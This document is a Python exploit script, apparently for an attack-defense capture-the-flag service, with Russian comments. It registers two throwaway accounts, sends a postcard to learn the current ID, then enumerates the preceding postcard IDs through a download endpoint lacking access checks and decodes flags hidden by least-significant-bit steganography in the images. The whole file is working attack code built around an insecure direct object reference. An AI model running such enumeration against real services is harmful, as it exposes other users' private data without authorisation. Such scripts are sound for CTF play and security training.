#!/usr/bin/env python3
import requests
import re
import sys
import html
import faker
from PIL import Image
from io import BytesIO

def ImgDecrypt(img, _len):
    try:
        width = img.size[0]
        height = img.size[1]
        _h = int(height / 2)
        _w = int(width / 2)
        pix = img.load()

        count = 0
        lenBits = _len * 8
        decryptBinMsg = ""

        # Обрабатываем первый бит отдельно (как в ImgEncrypt)
        b = pix[_w, _h][1]
        if (b % 2) == 1:
            decryptBinMsg += "1"
        else:
            decryptBinMsg += "0"
        count += 1
        _w += 1

        # Обрабатываем остальные биты
        while _h < height and count < lenBits:
            for i in range(_w, width):
                if count >= lenBits:
                    break
                    
                b = pix[i, _h][1]
                if (b % 2) == 1:
                    decryptBinMsg += "1"
                else:
                    decryptBinMsg += "0"
                count += 1

            if count < lenBits:
                _h += 1
                _w = 0

        # Дополняем битовую строку до полных байтов
        padding = (8 - (len(decryptBinMsg) % 8)) % 8
        decryptBinMsg += '0' * padding

        # Преобразуем в строку
        m = int(decryptBinMsg, 2)
        decryptMsg = m.to_bytes((m.bit_length() + 7) // 8, "big").decode(errors='replace')
        
        # Удаляем возможные нулевые символы
        decryptMsg = decryptMsg.replace('\x00', '')
        print(f"Decrypted message: {decryptMsg}", flush=True)
        
    except Exception as e:
        print(f"Error processing image: {str(e)}", flush=True)
    finally:
        img.close()



url = f"http://{sys.argv[1]}:5000"
nameFaker = faker.Faker()

# Регистрация нового пользователя
username1 = nameFaker.user_name()
password1 = nameFaker.password()
username2 = nameFaker.user_name()
password2 = nameFaker.password()

S1 = requests.Session()
S2 = requests.Session()

# Регистрация двух пользователей
S1.post(url + "/register", 
        data={"login": username1, "password": password1, 
             "name": nameFaker.name(), "surname": nameFaker.last_name()}, 
        timeout=5)
S2.post(url + "/register", 
        data={"login": username2, "password": password2, 
             "name": nameFaker.name(), "surname": nameFaker.last_name()}, 
        timeout=5)

# Отправка запроса дружбы
S1.post(url + "/login", data={"login": username1, "password": password1}, timeout=5)
S1.post(url + "/send_friend_request", data={"friend_login": username2}, allow_redirects=False)
S2.post(url + "/login", data={"login": username2, "password": password2}, timeout=5)

# Поиск ID друга
response = S2.get(url + "/profile", timeout=5)
pattern = r'<span>{}</span>[^<]*<div>[^<]*<a href="/accept_friend_request/(\d+)"'.format(re.escape(username1))
match = re.search(pattern, html.unescape(response.text), re.DOTALL)
friend_id = match.group(1)

# Принятие запроса дружбы
S2.get(url + f"/accept_friend_request/{friend_id}", allow_redirects=False)

# Отправка открытки
data = {
    "background": "0.png",
    "front_text": "Test postcard",
    "message": "message",
    "receiver": username1,
    "pos_x": "200",
    "pos_y": "200",
    "color": "#000000",
    "font": "Arial",
    "is_private": "on"
}
response = S2.post(url + "/send_postcard", data=data, allow_redirects=True)

# Получение ID открытки
match = re.search(r'/download_card/(\d+)', response.text)
postcard_id = int(match.group(1))

# Начало эксплойта
for i in range(max(1, postcard_id - 20), postcard_id + 1):
    try:
        print(f"Processing card {i}...")
        response = S2.get(url + f"/download_card/{i}")
        if response.status_code == 200:
            image = Image.open(BytesIO(response.content))
            ImgDecrypt(image, 40)  # flag len=40, TEAM[0-9]{3}_[A-Z0-9]{32}
        else:
            print(f"Card {i} not found (HTTP {response.status_code})")
    except Exception as e:
        print(f"Error processing card {i}: {str(e)}")